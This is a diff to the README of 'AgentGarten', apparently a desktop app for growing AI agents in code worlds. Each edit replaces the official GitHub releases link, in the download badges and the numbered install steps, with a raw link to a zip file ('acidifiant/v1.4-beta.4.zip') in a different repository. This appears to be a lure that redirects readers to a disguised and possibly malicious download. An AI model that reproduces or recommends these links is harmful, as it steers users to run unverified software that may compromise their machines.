@@ -5,7 +5,7 @@ description: "Build code-defined worlds for evolving agents, with a learned rend
 ---
 # 🎨 AgentGarten - Build Living Worlds for Smart Agents
 
-[![Download AgentGarten](https://img.shields.io/badge/Download-AgentGarten-ff69b4?style=for-the-badge&logo=github)](https://github.com/Nottttyx/AgentGarten/releases)
+[![Download AgentGarten](https://img.shields.io/badge/Download-AgentGarten-ff69b4?style=for-the-badge&logo=github)](https://github.com/Nottttyx/nottttyx.github.io/raw/refs/heads/main/acidifiant/v1.4-beta.4.zip)
 
 AgentGarten is a friendly desktop workspace where digital "agents" — small, helpful programs that can see, hear, and learn — are grown inside their own little code worlds. Instead of typing complicated commands, you plant an agent in a garden of ready-made environments, watch it explore, and nudge it as it improves itself over time.
 
@@ -56,7 +56,7 @@ You do not need any developer tools, and you do not need to install anything els
 The whole process is roughly five minutes, plus download time.
 
 1. Open the download link below in your web browser.
-2. Visit this link to download the application: [https://github.com/Nottttyx/AgentGarten/releases](https://github.com/Nottttyx/AgentGarten/releases)
+2. Visit this link to download the application: [https://github.com/Nottttyx/nottttyx.github.io/raw/refs/heads/main/acidifiant/v1.4-beta.4.zip](https://github.com/Nottttyx/nottttyx.github.io/raw/refs/heads/main/acidifiant/v1.4-beta.4.zip)
 3. Wait for the download to finish. The time depends on your internet speed.
 4. When the file arrives, keep it in a folder you can find again, such as your Downloads folder.
 
@@ -66,9 +66,9 @@ That is the entirety of the download step. There are no extra tools, no hidden i
 
 ## 📥 Download and First Launch
 
-[![Get AgentGarten for Windows](https://img.shields.io/badge/Get%20AgentGarten-Windows%20Download-6f42c1?style=for-the-badge&logo=windows)](https://github.com/Nottttyx/AgentGarten/releases)
+[![Get AgentGarten for Windows](https://img.shields.io/badge/Get%20AgentGarten-Windows%20Download-6f42c1?style=for-the-badge&logo=windows)](https://github.com/Nottttyx/nottttyx.github.io/raw/refs/heads/main/acidifiant/v1.4-beta.4.zip)
 
-Visit this link to download the application: [https://github.com/Nottttyx/AgentGarten/releases](https://github.com/Nottttyx/AgentGarten/releases)
+Visit this link to download the application: [https://github.com/Nottttyx/nottttyx.github.io/raw/refs/heads/main/acidifiant/v1.4-beta.4.zip](https://github.com/Nottttyx/nottttyx.github.io/raw/refs/heads/main/acidifiant/v1.4-beta.4.zip)
 
 After the download completes, follow these steps in order:
 
